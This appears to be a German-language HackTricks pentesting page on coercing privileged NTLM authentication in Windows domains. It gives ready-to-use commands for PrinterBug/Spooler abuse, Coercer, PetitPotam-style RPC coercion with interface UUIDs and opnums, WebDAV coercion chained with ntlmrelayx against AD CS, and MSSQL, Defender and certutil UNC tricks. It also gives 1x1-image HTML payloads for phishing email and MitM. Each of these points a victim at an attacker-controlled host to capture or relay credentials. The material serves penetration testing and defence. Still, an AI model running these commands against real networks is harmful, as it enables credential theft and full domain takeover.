# Force NTLM Privilegierte Authentifizierung

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **Remote-Authentifizierungs-Triggern**, in C# mit dem MIDL-Compiler geschrieben, um Abhängigkeiten von Drittanbietern zu vermeiden.

## Spooler Service Abuse

Wenn der _**Print Spooler**_ Service **aktiviert** ist, kannst du einige bereits bekannte AD-Credentials verwenden, um beim Domain Controller’s print server ein **Update** zu neuen Print Jobs anzufordern und ihm einfach mitzuteilen, die Benachrichtigung an ein bestimmtes System zu **senden**.\
Beachte: Wenn der Printer die Benachrichtigung an ein beliebiges System sendet, muss er sich bei diesem **authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_ Service dazu bringen, sich bei einem beliebigen System zu authentifizieren, und der Service wird dabei das **Computer-Account** verwenden.

Unter der Haube missbraucht die klassische **PrinterBug**-Primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** über **`\\PIPE\\spoolss`**. Der Angreifer öffnet zuerst einen Printer/Server-Handle und liefert dann einen gefälschten Client-Namen in `pszLocalMachine`, sodass der Ziel-Spooler einen Notification-Channel **zurück zum vom Angreifer kontrollierten Host** erstellt. Deshalb ist der Effekt **outbound authentication coercion** statt direkter Codeausführung.\
Wenn du nach **RCE/LPE** im Spooler selbst suchst, schau dir [PrintNightmare](printnightmare.md) an. Diese Seite konzentriert sich auf **coercion und relay**.

### Windows Server auf der Domain finden

Mit PowerShell erhältst du eine Liste von Windows-Boxen. Server haben normalerweise Priorität, also konzentrieren wir uns darauf:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Auffinden lauschender Spooler-Dienste

Mit einer leicht modifizierten Version von @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) prüfen, ob der Spooler Service lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Du kannst auch `rpcdump.py` unter Linux verwenden und nach dem **MS-RPRN**-Protokoll suchen:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oder teste Hosts schnell von Linux aus mit **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Wenn du **coercion surfaces enumerieren** willst, statt nur zu prüfen, ob der spooler endpoint existiert, verwende **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dies ist nützlich, weil das Anzeigen des Endpunkts in EPM dir nur sagt, dass die Print-RPC-Schnittstelle registriert ist. Es garantiert **nicht**, dass jede Coercion-Methode mit deinen aktuellen Rechten erreichbar ist oder dass der Host einen nutzbaren Authentifizierungs-Flow ausgibt.

### Bitte den Service, sich gegenüber einem beliebigen Host zu authentifizieren

Du kannst [SpoolSample von hier kompilieren](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwende [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du auf Linux bist
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Mit **Coercer** kannst du die spooler interfaces direkt anvisieren und vermeiden zu raten, welche RPC method exposed ist:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Erzwingen von HTTP statt SMB mit WebClient

Der klassische PrinterBug führt normalerweise zu einer **SMB**-Authentifizierung an `\\attacker\share`, was weiterhin nützlich ist für **capture**, **relay to HTTP targets** oder **relay where SMB signing is absent**.\
In modernen Umgebungen wird jedoch das **SMB to SMB**-Relaying häufig durch **SMB signing** blockiert, daher bevorzugen Operatoren oft, stattdessen **HTTP/WebDAV**-Authentifizierung zu erzwingen.

Wenn auf dem Ziel der **WebClient**-Dienst läuft, kann der Listener in einer Form angegeben werden, die Windows dazu bringt, **WebDAV über HTTP** zu verwenden:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dies ist besonders nützlich beim Ketten mit **`ntlmrelayx --adcs`** oder anderen HTTP-Relay-Zielen, weil es verhindert, dass man sich auf SMB-Relayability der erzwungenen Verbindung verlassen muss. Die wichtige Einschränkung ist, dass **WebClient auf dem Opfer laufen muss**, damit die HTTP/WebDAV-Variante funktioniert.

### Combining with Unconstrained Delegation

Wenn ein Angreifer bereits einen Computer mit [Unconstrained Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer **den Drucker dazu bringen, sich gegenüber diesem Computer zu authentifizieren**. Aufgrund der Unconstrained Delegation wird das **TGT** des **Computer-Accounts des Druckers** im **Memory** des Computers mit Unconstrained Delegation **gespeichert**. Da der Angreifer diesen Host bereits kompromittiert hat, kann er **dieses Ticket abrufen** und missbrauchen ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchrones Print-Interface auf demselben spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Bei der Verarbeitung authentifiziert sich Windows (Maschinen-/Benutzerkontext) gegenüber diesem UNC und ermöglicht so NetNTLM-Capture oder Relay.\
Beim spooler abuse bleibt **MS-RPRN opnum 65** das gebräuchlichste und am besten dokumentierte Primitive, da die Protokollspezifikation ausdrücklich sagt, dass der Server einen Benachrichtigungskanal zurück zum Client erstellt, der durch `pszLocalMachine` angegeben wird.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN über \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: das Ziel versucht, den angegebenen Backup-Log-Pfad zu öffnen und authentifiziert sich gegenüber dem attacker-controlled UNC.
- Practical use: Tier 0 Assets (DC/RODC/Citrix/etc.) dazu zwingen, NetNTLM auszugeben, und dann an AD CS endpoints (ESC8/ESC11 scenarios) oder andere privilegierte Dienste relayn.

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis einer Schwachstelle im **Exchange Server `PushSubscription` feature**. Dieses Feature erlaubt es, den Exchange server von jedem Domain-User mit einem mailbox dazu zu zwingen, sich über HTTP gegenüber einem beliebigen, vom client bereitgestellten Host zu authentifizieren.

Standardmäßig läuft der **Exchange service als SYSTEM** und erhält übermäßige Privilegien (genauer gesagt hat er **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Diese Schwachstelle kann ausgenutzt werden, um das **Relaying von Informationen an LDAP und anschließend das Extrahieren der Domain NTDS database** zu ermöglichen. Falls ein Relay zu LDAP nicht möglich ist, kann diese Schwachstelle dennoch verwendet werden, um zu anderen Hosts innerhalb der Domain zu relayen und sich zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt mit jedem authentifizierten Domain-User-Account unmittelbaren Zugriff auf den Domain Admin.

## Inside Windows

Wenn du bereits auf der Windows-Maschine bist, kannst du Windows zwingen, sich mit privilegierten Accounts zu einem Server zu verbinden mit:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwende diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, certutil.exe lolbin (von Microsoft signierte Binary) zu verwenden, um NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-Injection

### Via E-Mail

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich an einem Rechner anmeldet, den du kompromittieren willst, könntest du ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie z. B.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
und wenn er es öffnet, wird er versuchen, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff auf einen Computer durchführen und HTML in eine Seite injizieren kannst, die er anzeigen wird, könntest du versuchen, ein Bild wie das folgende in die Seite zu injizieren:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Wege, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracken

Wenn du [NTLMv1 challenges erfassen kannst, lies hier, wie man sie crackt](../ntlm/index.html#ntlmv1-attack).\
_Denk daran, dass du zum Cracken von NTLMv1 die Responder challenge auf "1122334455667788" setzen musst_

## Referenzen
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
